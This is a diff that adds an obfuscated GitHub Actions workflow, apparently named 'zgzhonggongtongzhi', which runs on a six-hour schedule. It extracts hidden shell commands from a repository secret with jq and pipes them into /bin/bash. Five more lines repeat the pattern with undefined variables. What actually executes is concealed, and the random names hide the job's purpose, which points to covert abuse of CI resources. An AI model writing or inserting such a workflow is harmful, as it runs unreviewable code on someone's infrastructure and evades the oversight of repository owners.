@@ -1,0 +1,22 @@
+name: zgzhonggongtongzhi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zgzhonggongtongzhi
+        env:
+          ioklj22481: ${{ secrets.ioklj22481 }}
+        run: |
+          echo $ioklj22481 | jq -r .jy4 | /bin/bash
+          echo $fvc4 | jq -r .akitz0 | /bin/bash
+          echo $nnxh24663 | jq -r .j05 | /bin/bash
+          echo $xsp9 | jq -r .vdqbm36986 | /bin/bash
+          echo $bq9029 | jq -r .n29 | /bin/bash
+          echo $kbkog138 | jq -r .s11 | /bin/bash
+
